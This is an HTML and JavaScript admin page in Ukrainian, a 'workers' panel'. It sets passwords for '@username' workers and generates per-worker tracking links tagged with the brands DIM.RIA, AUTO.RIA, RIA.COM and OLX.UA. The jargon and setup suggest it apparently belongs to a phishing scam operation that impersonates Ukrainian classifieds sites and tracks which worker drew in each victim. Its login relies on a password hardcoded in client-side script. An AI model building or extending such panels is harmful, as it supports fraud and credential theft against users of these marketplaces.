<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Панель воркерів</title>
  <style>
    body {font-family: 'Segoe UI', sans-serif;background: #1a1a2e;color: #eee;display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;}
    .container {background: #16213e;padding: 30px;border-radius: 12px;box-shadow: 0 0 20px rgba(0,255,255,0.2);width: 380px;text-align: center;}
    h1 {margin: 0 0 20px;color: #00ffff;}
    select, input {width: 100%;padding: 12px;margin: 10px 0;border: 1px solid #00ffff;border-radius: 8px;background: #0f3460;color: #fff;font-size: 16px;}
    button {width: 100%;padding: 12px;background: #00ffff;color: #000;border: none;border-radius: 8px;font-weight: bold;cursor: pointer;margin-top: 10px;}
    button:hover {background: #00cccc;}
    .link-output, .status {margin-top: 20px;padding: 12px;background: #0f3460;border: 1px solid #00ffff;border-radius: 8px;word-break: break-all;font-family: monospace;color: #0f0;}
    .hidden { display: none; }
    .section { margin-bottom: 20px; }
    .success { color: #0f0; }
    .error { color: #f55; }
  </style>
</head>
<body>
  <div id="loginForm" class="container">
    <h1>Вхід у панель</h1>
    <input type="password" id="password" placeholder="Пароль" />
    <button onclick="checkPassword()">Увійти</button>
  </div>

  <div id="panel" class="container hidden">
    <h1>Панель воркерів</h1>

    <!-- Установка пароля -->
    <div class="section">
      <h3>Встановити пароль воркера</h3>
      <input type="text" id="setWorker" placeholder="@username" />
      <input type="password" id="setPassword" placeholder="Новий пароль (мін. 4)" />
      <button onclick="setWorkerPassword()">Зберегти пароль</button>
      <div id="setStatus" class="status"></div>
    </div>

    <hr style="border: 1px solid #00ffff; margin: 20px 0;">

    <!-- Генерация ссылки -->
    <div class="section">
      <h3>Генератор посилань</h3>
      <select id="project">
        <option value="dimria">DIM.RIA</option>
        <option value="autoria">AUTO.RIA</option>
        <option value="ria">RIA.COM</option>
        <option value="olx">OLX.UA</option>
      </select>
      <input type="text" id="nickname" placeholder="@username воркера" />
      <button onclick="generateLink()">Створити посилання</button>
      <div id="linkOutput" class="link-output hidden"></div>
    </div>
  </div>

  <script>
    const correctPassword = "1918";

    function checkPassword() {
      if (document.getElementById("password").value === correctPassword) {
        document.getElementById("loginForm").classList.add("hidden");
        document.getElementById("panel").classList.remove("hidden");
      } else {
        alert("Невірний пароль!");
      }
    }

    async function setWorkerPassword() {
      const worker = document.getElementById("setWorker").value.trim().replace(/^@/, '');
      const password = document.getElementById("setPassword").value;
      const status = document.getElementById("setStatus");

      if (!worker || !password || password.length < 4) {
        status.className = "status error";
        status.textContent = "Невірні дані (пароль ≥ 4 символи)";
        return;
      }

      try {
        const res = await fetch('/api/set-worker-password', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ worker, password })
        });
        const data = await res.json();
        if (data.success) {
          status.className = "status success";
          status.textContent = `Пароль для @${worker} збережено!`;
        } else {
          status.className = "status error";
          status.textContent = data.error || "Помилка";
        }
      } catch (err) {
        status.className = "status error";
        status.textContent = "Сервер недоступний";
      }
    }

    function generateLink() {
      const project = document.getElementById("project").value;
      const nick = document.getElementById("nickname").value.trim().replace(/^@/, '');
      if (!nick) return alert("Введіть @username воркера!");

      const base = window.location.origin;
      const refLink = `${base}/?project=${project}&ref=${btoa(nick)}`;

      const output = document.getElementById("linkOutput");
      output.textContent = refLink;
      output.classList.remove("hidden");
    }
  </script>
</body>
</html>
